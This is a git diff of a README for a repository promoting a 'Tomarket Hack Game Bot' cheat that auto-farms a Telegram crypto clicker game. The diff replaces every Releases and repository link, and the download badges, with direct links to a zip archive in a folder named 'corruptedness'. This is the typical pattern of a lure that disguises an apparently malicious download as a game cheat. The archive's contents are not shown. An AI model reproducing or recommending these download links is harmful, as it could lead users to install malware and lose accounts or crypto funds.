@@ -1,6 +1,6 @@
 # 🎮 Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat - Automate Your Game Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Get_the_Bot-brightgreen)](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Tomarket Hack Game Bot! This bot automates farming and clicker ac
 ## 📥 Download & Install
 
 To download the software, visit the Releases page:
-[Download the Bot](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
+[Download the Bot](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)
 
 ### 📋 System Requirements
 
@@ -21,7 +21,7 @@ To download the software, visit the Releases page:
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page.**
-   Go to the [Releases page](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip).
 
 2. **Download the Latest Version.**
    Click on the most recent version link to download the software package.
@@ -96,8 +96,8 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)  
-- [GitHub Repository](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat)  
+- [Releases Page](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)  
+- [GitHub Repository](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)  
 - [Join Our Telegram Community](#)
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Get_the_Bot-brightgreen)](https://github.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)](https://raw.githubusercontent.com/caruladiogo123/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/main/corruptedness/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat.zip)
